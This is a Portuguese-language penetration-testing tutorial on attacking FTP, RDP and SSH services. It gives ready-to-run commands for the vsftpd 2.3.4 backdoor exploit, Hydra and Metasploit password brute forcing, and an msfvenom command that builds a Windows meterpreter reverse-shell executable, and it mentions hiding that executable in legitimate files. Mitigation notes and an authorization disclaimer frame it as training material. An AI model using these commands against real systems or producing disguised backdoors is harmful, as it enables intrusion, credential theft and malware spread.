# Exploração de Falhas em Sistemas

## Objetivo Geral

Aprender técnicas avançadas para explorar vulnerabilidades em sistemas, garantir acesso remoto e extrair dados sensíveis.

---

## Pré-requisitos

- Conhecimento em redes e protocolos (FTP, RDP, SSH).
- Familiaridade com Metasploit e linha de comando.

---

## Etapa 1: Explorando Falhas no FTP

### Vulnerabilidades Comuns

| Tipo de Ataque           | Descrição                         | Impacto                      |
| ------------------------ | --------------------------------- | ---------------------------- |
| **Autenticação Anônima** | Acesso sem credenciais válidas.   | Exposição de arquivos.       |
| **Directory Traversal**  | Acesso a diretórios fora do root. | Roubo de dados sensíveis.    |
| **Cross-site Scripting** | Injeção de scripts maliciosos.    | Comprometimento de clientes. |

### Ferramentas Recomendadas

- **Metasploit**:
  ```bash
  use exploit/unix/ftp/vsftpd_234_backdoor
  set RHOSTS <alvo>
  exploit
  ```
- **Nmap** para reconhecimento:
  ```bash
  nmap -p 21 --script ftp-anon <alvo>
  ```

---

## Etapa 2: Ataque DoS no RDP

### Técnicas de Ataque

- **Força Bruta**: Uso de ferramentas como `Hydra`:
  ```bash
  hydra -L usuarios.txt -P senhas.txt rdp://<alvo>
  ```
- **Exploração de Vulnerabilidades**:
  - CVE-2019-0708 (BlueKeep).

### Prevenção

- Habilitar **autenticação multifator**.
- Configurar **políticas de bloqueio** após tentativas falhas.
- Restringir acesso via **firewall**.

---

## Etapa 3: Explorando Falhas no SSH

### Ataque de Força Bruta

1. Gerar wordlists com `crunch`:
   ```bash
   crunch 6 8 0123456789 -o senhas.txt
   ```
2. Usar `Metasploit`:
   ```bash
   use auxiliary/scanner/ssh/ssh_login
   set RHOSTS <alvo>
   set USERPASS_FILE credenciais.txt
   run
   ```

### Mitigação

- Desativar login por senha (usar chaves SSH).
- Limitar tentativas com `fail2ban`.

---

## Etapa 4: Adicionando Backdoor em Executáveis

### Técnicas

1. **Criar backdoor com `msfvenom`**:
   ```bash
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f exe -o app.exe
   ```
2. **Ocultação**:
   - Usar técnicas de _steganografia_ para embutir em arquivos legítimos.

### Detecção e Prevenção

- **Antivírus**: Soluções como Windows Defender ou ClamAV.
- **Análise estática**: Verificar hashes com `sha256sum`.

---

## Fluxo de Trabalho com Metasploit

### Módulos Principais

| Tipo        | Descrição                          | Exemplo                                   |
| ----------- | ---------------------------------- | ----------------------------------------- |
| **Singles** | Exploits autônomos.                | `exploit/windows/smb/ms17_010`            |
| **Stagers** | Estabelece conexão inicial.        | `payload/windows/meterpreter/reverse_tcp` |
| **Stages**  | Carrega funcionalidades avançadas. | `meterpreter`                             |

### Comandos Úteis

- Iniciar console: `msfconsole`.
- Buscar exploits: `search type:exploit platform:windows`.

---

## Boas Práticas de Segurança

- **Para Administradores**:
  - Atualizar sistemas regularmente.
  - Auditar permissões de serviços (FTP/SSH/RDP).
- **Para Pentesters**:
  - Documentar todas as etapas.
  - Usar ambientes controlados (ex: Metasploitable).

**Aviso Legal**: Estas técnicas devem ser aplicadas apenas em sistemas com autorização explícita.
